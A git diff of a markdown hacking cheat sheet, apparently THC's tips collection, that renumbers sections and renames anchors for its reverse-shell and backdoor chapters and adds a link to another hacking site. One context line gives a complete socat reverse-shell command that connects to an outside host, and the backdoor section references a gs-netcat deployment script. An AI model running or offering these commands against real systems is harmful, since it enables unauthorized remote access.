@@ -36,7 +36,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [File transfer using screen from REMOTE to LOCAL](#ftsrl-anchor)
    1. [File transfer using screen from LOCAL to REMOTE](#ftslr-anchor)
    1. [File transfer using gs-netcat and sftp](#ftgs-anchor)
-1. [Reverse Shell / Dumb Shell](#rs-anchor)
+1. [Reverse Shell / Dumb Shell](#reverse)
    1. [Reverse Shells](#rs-anchor)
       1. [with gs-netcat](#rswg-anchor)
       1. [with Bash](#rswb-anchor)
@@ -76,7 +76,8 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
    1. [Tools of the trade](#tools)
    1. [Cool Linux commands](#cool-anchor)
    1. [tmux](#tmux-anchor)
-   1. [Useful commands](#useful-anchor)  
+   1. [Useful commands](#useful-anchor)
+1. [Other Sites](#others)
     
    
 
@@ -482,7 +483,8 @@ sftp -D gs-netcat                                        # Workstation
 ```
 
 ---
-<a id="rs-anchor"></a>
+<a id="reverse"></a>
+## 5. Reverse Shells
 <a id="rswg-anchor"></a>
 **5.i.a. Reverse shell with gs-netcat**
 
@@ -616,7 +618,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 
 ---
 <a id="backdoor"></a>
-## Backdoors
+## 6. Backdoors
 
 Mostly we use gs-netcat's automated deployment script: [https://www.gsocket.io/deploy](https://www.gsocket.io/deploy).
 ```sh
@@ -1006,4 +1008,9 @@ Example for *SSH*:
 rlwrap --always-readline ssh user@host
 ```
 ---
+<a id="others"></a>
+## 12. Other Sites
+
+1. https://book.hacktricks.xyz/welcome/readme
+
 Shoutz: ADM, subz/#9x, DrWho
